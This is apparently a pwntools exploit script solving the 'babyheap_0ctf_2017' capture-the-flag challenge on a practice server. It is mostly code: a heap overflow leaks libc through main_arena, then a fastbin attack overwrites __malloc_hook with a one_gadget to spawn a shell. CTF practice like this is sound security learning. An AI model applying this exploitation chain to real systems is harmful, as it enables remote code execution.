# import time
from pwn import *

# from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# io = remote("192.168.170.128", 9999)
io = remote("node5.buuoj.cn", 28486)


# io = remote("120.46.59.242",   2150)
# io = remote("43.249.195.138",  26189)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("112.6.51.212", 30791)

# io = process('./babyheap_0ctf_2017')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./ciscn_2019_es_2')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.23.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# printf_plt = elf.plt['printf']
# atoi_got = elf.got['atoi']
# main_addr = elf.symbols['main']
#
# libc = ELF('./libc.so.6')

context(os='linux', arch='amd64')


# context(os='linux', arch='amd64', log_level="debug")

# elf = ELF('./babyheap_0ctf_2017')
# write_got = elf.got['write']
# write_plt = elf.plt['write']
# printf_got = elf.got['printf']
# ret2addr = elf.symbols['Start']

libc = ELF('./libs/buu16/libc.so.6')
onegg_offset = 0x4526a

def allocate(size):
    io.sendlineafter("Command:", '1')
    io.sendlineafter("Size:", str(size))


def fill(index, content):
    io.sendlineafter("Command:", '2')
    io.sendlineafter("Index:", str(index))
    io.sendlineafter("Size:", str(len(content)))
    io.sendafter("Content:", content)


def free(index):
    io.sendlineafter("Command:", '3')
    io.sendlineafter("Index:", str(index))


def dump(index):
    io.sendlineafter("Command:", '4')
    io.sendlineafter("Index:", str(index))


allocate(0x10)  # 0
allocate(0x10)  # 1
allocate(0x80)  # 2
allocate(0x10)  # 3
allocate(0x60)  # 4

# ? --------------- leak libc ---------------
fill(0, p64(0) * 3 + p64(0x51))
fill(2, p64(0) * 5 + p64(0x91))

free(1)
allocate(0x40)

fill(1, p64(0) * 3 + p64(0x91))
free(2)

io.recv()
dump(1)
io.recvuntil("Content:")
# ? --------------- leak libc end ---------------


# ? --------------- get libc base ---------------
main_arena_88_addr = u64(io.recv(0x28)[0x22:].ljust(8, b"\x00"))
print("Main Arena + 88 : " + hex(main_arena_88_addr))
malloc_hook_addr = main_arena_88_addr - 88 - 0x10
fake_small_bin_addr = malloc_hook_addr - 0x23
libc_addr = malloc_hook_addr - libc.sym["__malloc_hook"]
onegg = onegg_offset + libc_addr
print("Libc base: " + hex(libc_addr))
# ? --------------- get libc base end ---------------


# ! --------------- fast bin attack ---------------
free(4)
fill(3, p64(0) * 3 + p64(0x71) + p64(fake_small_bin_addr))
allocate(0x60)
allocate(0x60)
fill(4, b"a" * 0x13 + p64(onegg))
# ! --------------- fast bin attack finished ---------------


# * --------------- get shell ---------------
allocate(1)

inter()
